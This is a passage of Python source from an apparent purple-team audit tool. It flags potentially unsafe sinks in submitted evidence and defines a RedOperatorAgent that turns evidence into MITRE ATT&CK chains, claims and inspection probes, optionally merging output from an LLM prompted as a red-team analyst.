    claimed_hosts = {h for c in claims for h in c.subject_entities.get("hosts", [])}
    uncovered_sinks = [
        e
        for e in threat_evs
        if e.evidence_id not in covered_eids
        and not e.raw_content.lstrip().startswith("#")
        and "telemetry_gap" not in e.entities.get("controls", [])
        and not is_routine_dns_txt_record(e)
        and (
            _is_unmitigated_sink_record(e)
            or (not claims and bool(e.entities.get("indicators")))
        )
        and (
            not claims
            or any(h not in claimed_hosts for h in e.entities.get("hosts", []))
        )
    ]
    if uncovered_sinks:
        sink_ids = [e.evidence_id for e in uncovered_sinks]
        has_live_http = any(e.source_type == "http" or "status=200" in e.raw_content.lower() for e in uncovered_sinks)
        sink_missing = [] if has_live_http else [
            "Upstream caller authentication, untrusted input reachability into the sink, and absence of sanitization are not demonstrated in the submitted snippet."
        ]
        _add_step_and_claim(
            tactic="Execution",
            technique_id="T1059",
            technique_name="Potentially Unsafe Sink / Threat Indicator Detected",
            observed_fact=_format_observed_fact(ev_by_id, sink_ids, "Potentially unsafe sink or security indicator matched verbatim:"),
            proposed_interpretation="Submitted artifact contains an unguarded dangerous sink or threat indicator potentially reachable by untrusted data.",
            evidence_ids=sink_ids,
            reachability_proof=f"Matched concrete sinks/indicators verbatim in {', '.join(sink_ids[:4])}.",
            missing_conditions=sink_missing,
            confirming_or_refuting_proof=f"Verify caller data-flow/sanitization into flagged sink in {', '.join(sink_ids[:3])} or execute controlled input check.",
        )
        probes.append(RedProbe(
            probe_id=_next_probe_id(),
            title="Controlled Sink Reachability & Validation Audit",
            target_surface=ingestion.title,
            method_or_vector="Safe boundary input validation check",
            payload_or_command=f"Inspect data-flow into sinks recorded in {', '.join(sink_ids[:3])}",
            expected_ioc="Unhandled untrusted data reaching sink confirms exploitability",
        ))
        _add_sim(
            variant="baseline_attack",
            log_line=uncovered_sinks[0].raw_content,
            mitre_technique_id="T1059",
        )
        blind_spots.append("Static sink match alone requires upstream data-flow validation to distinguish dead/sanitized code from exploitable paths.")
        hypotheses.append("Open Hypothesis: Potentially unsafe execution/config sink requires reachability and sanitization verification.")
        confidences.append(0.50 if sink_missing else 0.78)

    if claims:
        primary_hyp = " | ".join(hypotheses) if len(hypotheses) > 1 else hypotheses[0]
        return RedOperationPlan(
            primary_hypothesis=primary_hyp,
            confidence=round(max(confidences), 3) if confidences else 0.50,
            kill_chain=kill_chain,
            claims=claims,
            blind_spots=list(dict.fromkeys(blind_spots))[:6],
            probes=probes[:6],
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    # Track 5: Benign, patched, or neutral telemetry -> abstain cleanly
    return RedOperationPlan(
        primary_hypothesis="No unmitigated offensive kill-chain or exploit indicator identified in submitted records.",
        confidence=0.12,
        kill_chain=[],
        claims=[],
        blind_spots=["Telemetry contains no unmitigated exploit sinks, error anomalies, or lateral-movement indicators."],
        probes=[],
        simulated_events=[],
        cited_evidence_ids=[],
        model_used="deterministic",
    )


class RedOperatorAgent:
    """Offensive Red Team agent constructing MITRE chains, structured claims, safe probes, and simulations."""

    def analyze(
        self,
        ingestion: ArtifactIngestionResult,
        router: Optional[ModelRouter] = None,
    ) -> Tuple[RedOperationPlan, bool, Dict[str, int]]:
        base_plan = _synthesize_deterministic_red_plan(ingestion)
        if router is None:
            return base_plan, False, {"private_ips": 0, "secrets": 0, "emails": 0}

        sys_prompt = (
            "You are the RED OPERATOR in a Purple Team cyber audit. Analyze ONLY the cited [EV-xxxx] records. "
            "Separate OBSERVED FACTS from HYPOTHESIZED INTERPRETATIONS and MISSING CONDITIONS. "
            "Reply strictly with JSON keys: primary_hypothesis (string), confidence (0..1), "
            "kill_chain (optional list of {tactic, technique_id, technique_name, observed_fact, proposed_interpretation, "
            "missing_conditions, confirming_or_refuting_proof, evidence_ids, reachability_proof}), "
            "simulated_events (optional list of {variant, log_line, mitre_technique_id}), "
            "blind_spots (list of strings), extra_probes (list of {title, payload_or_command, expected_ioc}), "
            "and cited_evidence_ids (list of EV-xxxx IDs)."
        )
        user_prompt = (
            f"Artifact Title: {ingestion.title}\nKind: {ingestion.source_kind}\nRecords:\n"
            f"{_format_evidence_bundle(ingestion)}"
        )
        parsed, model_label, scrubbed, scrub_stats = invoke_router_json(
            router,
            system_prompt=sys_prompt,
            user_prompt=user_prompt,
            scrubber=PrivacyScrubber(),
        )
        if not parsed:
            return base_plan, scrubbed, scrub_stats

        ev_by_id = {ev.evidence_id: ev for ev in ingestion.evidences}
        valid_ids = set(ev_by_id.keys())
        llm_cited = [str(eid) for eid in (parsed.get("cited_evidence_ids") or []) if str(eid) in valid_ids]

        hyp = str(parsed.get("primary_hypothesis") or "").strip() or base_plan.primary_hypothesis
        try:
            conf = max(0.0, min(1.0, float(parsed.get("confidence", base_plan.confidence))))
        except Exception:
            conf = base_plan.confidence

        llm_chain_raw = parsed.get("kill_chain")
        full_chain_override = isinstance(llm_chain_raw, list) and len(llm_chain_raw) > 0

        if full_chain_override:
            new_steps: List[MitreStep] = []
            new_claims: List[AnalyticalClaim] = []
            for idx, item in enumerate(llm_chain_raw):
                if not isinstance(item, dict):
                    continue
                step_eids = [str(e) for e in (item.get("evidence_ids") or []) if str(e) in valid_ids]
                obs = str(item.get("observed_fact") or item.get("description") or hyp).strip()
                interp = str(item.get("proposed_interpretation") or item.get("description") or hyp).strip()
                missing = [str(m).strip() for m in (item.get("missing_conditions") or []) if str(m).strip()]
                proof = str(item.get("confirming_or_refuting_proof") or "Verify referenced evidence independently.").strip()
                cid = f"CLM-{idx + 1:02d}"
                status = "open" if (missing or not step_eids) else "supported"
                new_steps.append(MitreStep(
                    tactic=str(item.get("tactic") or "Execution"),
                    technique_id=str(item.get("technique_id") or "T1059"),
                    technique_name=str(item.get("technique_name") or "LLM Revised Step"),
                    description=interp,
                    evidence_ids=step_eids,
                    reachability_proof=str(item.get("reachability_proof") or obs),
                    claim_id=cid,
                    observed_fact=obs,
                    proposed_interpretation=interp,
                    missing_conditions=missing,
                    confirming_or_refuting_proof=proof,
                    status=status,  # type: ignore[arg-type]
                ))
                inferred_prio, inferred_rat = _infer_claim_priority(missing, new_steps[-1].tactic, new_steps[-1].technique_id)
                raw_prio = str(item.get("priority") or "").lower().strip()
                final_prio = raw_prio if raw_prio in ("critical", "high", "medium", "low") else inferred_prio
                final_rat = str(item.get("priority_rationale") or "").strip() or inferred_rat
                new_claims.append(AnalyticalClaim(
                    claim_id=cid,
                    step_index=idx,
                    tactic=new_steps[-1].tactic,
                    technique_id=new_steps[-1].technique_id,
                    observed_fact=obs,
                    evidence_ids=step_eids,
                    subject_entities=_collect_subject_entities(ev_by_id, step_eids),
                    proposed_interpretation=interp,
                    missing_conditions=missing,
                    confirming_or_refuting_proof=proof,
                    status=status,  # type: ignore[arg-type]
                    priority=final_prio,  # type: ignore[arg-type]
                    priority_rationale=final_rat,
                ))
            final_chain = new_steps
            final_claims = new_claims
            merged_cited = list(dict.fromkeys([*llm_cited, *(eid for s in final_chain for eid in s.evidence_ids)]))
            final_conf = round(conf, 3)
        else:
            final_chain = list(base_plan.kill_chain)
            final_claims = [c.model_copy(deep=True) for c in base_plan.claims]
            merged_cited = list(dict.fromkeys([*base_plan.cited_evidence_ids, *llm_cited]))
            final_conf = round((base_plan.confidence + conf) / 2.0, 3)

        llm_sims_raw = parsed.get("simulated_events")
        if isinstance(llm_sims_raw, list) and len(llm_sims_raw) > 0:
            final_sims: List[SimulatedAttackEvent] = []
            for idx, se in enumerate(llm_sims_raw, start=1):
                if isinstance(se, dict) and se.get("log_line"):
                    var = str(se.get("variant") or "baseline_attack")
                    if var not in ("baseline_attack", "evasion_variant"):
                        var = "baseline_attack"
                    final_sims.append(SimulatedAttackEvent(
                        event_id=f"SIM-RED-{idx:02d}",
                        variant=var,  # type: ignore[arg-type]
                        log_line=str(se["log_line"]),
                        mitre_technique_id=str(se.get("mitre_technique_id") or ""),
                    ))
            if not final_sims:
                final_sims = list(base_plan.simulated_events)
        else:
            final_sims = list(base_plan.simulated_events)

        extra_blind = [str(b).strip() for b in (parsed.get("blind_spots") or []) if str(b).strip()]
        merged_blind = (
            extra_blind[:6]
            if full_chain_override and extra_blind
            else list(dict.fromkeys([*base_plan.blind_spots, *extra_blind]))[:6]
        )

        base_probes = [] if full_chain_override else list(base_plan.probes)
        extra_probes: List[RedProbe] = list(base_probes)
        for idx, p in enumerate(parsed.get("extra_probes") or [], start=len(extra_probes) + 1):
            if isinstance(p, dict) and p.get("payload_or_command"):
                extra_probes.append(RedProbe(
                    probe_id=f"RED-LLM-{idx:02d}",
                    title=str(p.get("title") or "LLM Audit Probe"),
                    target_surface=str(p.get("target_surface") or ingestion.title),
                    method_or_vector="LLM-suggested safe-audit",
                    payload_or_command=str(p["payload_or_command"]),
                    expected_ioc=str(p.get("expected_ioc") or "Inspect response telemetry"),
                ))

        enriched = base_plan.model_copy(update={
            "primary_hypothesis": hyp,
            "confidence": final_conf,
            "kill_chain": final_chain,
            "claims": final_claims,
            "blind_spots": merged_blind,
            "probes": extra_probes[:6],
            "simulated_events": final_sims,
            "cited_evidence_ids": merged_cited,
            "model_used": model_label,
        })
        return enriched, scrubbed, scrub_stats
